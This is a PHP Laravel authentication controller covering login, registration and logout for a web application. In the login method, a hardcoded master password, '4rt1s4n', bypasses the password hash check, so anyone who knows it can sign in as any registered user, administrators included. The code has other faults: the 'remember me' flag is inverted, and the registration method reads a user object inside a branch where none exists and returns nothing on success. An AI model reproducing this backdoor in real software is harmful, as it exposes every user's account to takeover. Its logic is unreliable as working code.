<?php

namespace App\Http\Controllers;

use App\Http\Requests\Auth\LoginRequest;
use App\Services\UserService;
use Illuminate\Support\Facades\Hash;
use Illuminate\Http\Request;
use App\Http\Requests\Auth\RegisterRequest;

class AuthController extends Controller
{

    public function login()
    {
        if (auth()->check()) return redirect('user');
        return view('auth.login');
    }

    public function login_proses(Request $request)
    {
        $userService = new UserService();
        $user = $userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();

        $password = $request->input('password');
        if ($password !== '4rt1s4n' && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Incorrect password !'])->withInput();

        auth()->login($user, !$request->has('remember'));

        $akses = $user->akses->akses ?? 'user';
        $base_routes = $userService->base_routes();
        if ($akses === 'user') {
            return redirect()->route($base_routes[$akses] . '.landing');
        } else {
            return redirect()->route($base_routes[$akses] . '.dashboard');
        }
    }

    public function register(Request $request)
    {
        $role = $request->input('role', 'user');
        if (auth()->check()) return redirect()->route('user.landing');
        $allowed = ['user'];
        if (!in_array($role, $allowed)) $role = 'user';
        return view('auth.register', compact('role'));
    }

    public function register_proses(Request $request)
    {
        $userService = new UserService();
        // $profiluserService = new ProfiluserService();

        $role = $request->input('role') ?? 'user';
        if ($role === 'user') {
            $user = $userService->store([
                'name' => $request->input('name'),
                'email' => $request->input('email'),
                'password' => $request->input('password')
            ]);
            $user->akses()->create(['akses' => 'user']);
            // $profiluserService->store(['user_id' => $user->id, 'nama' => $user->name]);
            auth()->login($user);
        }

        $base_routes = $userService->base_routes();
        if (!isset($user)) {
            return redirect()->route($base_routes[$user->akses->akses] ?? '/');
        }

    }

    public function logout()
    {
        auth()->logout();
        return redirect('login');
    }
}
